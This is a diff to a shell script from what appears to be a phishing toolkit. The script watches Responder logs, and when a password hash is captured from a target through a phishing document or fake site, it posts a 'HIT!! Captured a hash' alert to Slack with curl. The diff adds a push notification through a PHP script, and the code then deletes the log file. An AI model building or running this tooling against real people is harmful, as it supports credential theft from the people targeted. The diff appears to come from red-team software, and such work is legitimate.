@@ -37,14 +37,20 @@ do
 if [ $Title = "PhishingDocs" ]
 then
   message=$(echo "> *HIT!!* Captured a" $HashType "hash ("$Module") for" $Target "at" $Org "(<"$APIURL/phishingdocs/results?UUID=$UUID"|"$IP">)");
+  link=$(echo "$APIURL/phishingdocs/results?UUID=$UUID");
+  messagepush=$(echo "*HIT!!* Captured a" $HashType "hash ("$Module") for" $Target "at" $Org "("$IP")");
   curl -s -X POST --data-urlencode 'payload={"channel": "'$Channel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $Token
+  php /var/www/html/config/push.php "$messagepush" "HashBot" "./hash.png" "$link" "HashBot";
   rm /var/log/Responder/$file;
 fi
 
 if [ $Title = "FakeSite" ]
 then
   message=$(echo "> *HIT!!* Captured a" $HashType "hash ("$Module") for "$Target" at <"$APIURL/results?project=$Target"|"$IP">");
+  link=$(echo "$APIURL/results?project=$Target");
+  messagepush=$(echo "*HIT!!* Captured a" $HashType "hash ("$Module") for "$Target" at "$IP"");
   curl -s -X POST --data-urlencode 'payload={"channel": "'$SlackChannel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $SlackURL
+  php /var/www/html/config/push.php "$messagepush" "HashBot" "./hash.png" "$link" "HashBot";
   rm /var/log/Responder/$file;
 fi
 
